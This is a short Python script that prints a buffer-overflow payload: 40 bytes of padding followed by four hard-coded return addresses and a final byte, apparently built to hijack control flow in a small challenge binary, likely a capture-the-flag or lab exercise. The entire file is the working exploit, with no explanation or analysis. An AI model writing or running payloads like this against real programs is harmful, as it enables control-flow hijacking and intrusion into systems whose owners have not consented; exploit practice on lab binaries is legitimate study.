import sys

addr1 = 0x401847.to_bytes(8, byteorder='little')
addr2 = 0x4018b2.to_bytes(8, byteorder='little')
addr3 = 0x40191d.to_bytes(8, byteorder='little')
addr4 = 0x401988.to_bytes(8, byteorder='little')
end = 0x10.to_bytes(1, byteorder='little')

sys.stdout.buffer.write(b'A'*40+addr3+addr2+addr1+addr4+end)
